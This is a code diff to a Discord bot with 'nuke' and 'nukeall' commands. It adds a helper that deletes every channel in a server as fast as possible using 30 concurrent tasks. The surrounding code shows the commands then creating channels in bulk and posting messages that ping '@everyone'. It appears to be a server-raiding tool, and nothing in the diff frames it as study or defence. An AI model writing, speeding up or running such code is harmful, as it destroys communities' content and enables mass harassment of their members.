@@ -1088,11 +1088,19 @@ async def wipechat(ctx):
 # NUKE
 # ─────────────────────────────────────────────
 
+async def _fast_delete_channels(guild: discord.Guild, concurrency: int = 30):
+    """Delete all channels as fast as possible using a high-concurrency semaphore."""
+    sem = asyncio.Semaphore(concurrency)
+    async def _del(ch):
+        async with sem:
+            await safe(ch.delete())
+    await asyncio.gather(*[_del(ch) for ch in guild.channels])
+
 @bot.command()
 async def nuke(ctx, name: str, *, message: str = "@everyone"):
     global STOPPED
     STOPPED = False
-    await batch([ch.delete() for ch in ctx.guild.channels], **BATCH_CH)
+    await _fast_delete_channels(ctx.guild)
     ch_sem = asyncio.Semaphore(5)
     async def nuke_one():
         async with ch_sem:
@@ -1109,7 +1117,7 @@ async def nuke(ctx, name: str, *, message: str = "@everyone"):
 
 @bot.command()
 async def nukeall(ctx, *, name: str = "nuked"):
-    await batch([ch.delete() for ch in ctx.guild.channels], **BATCH_CH)
+    await _fast_delete_channels(ctx.guild)
     await batch([ctx.guild.create_text_channel(name) for _ in range(10)], **BATCH_CH)
     await status(ctx, f"nukeall {name}")
     await _log_embed(_action_embed("💥 Nuke All Executed", 0xff0000,
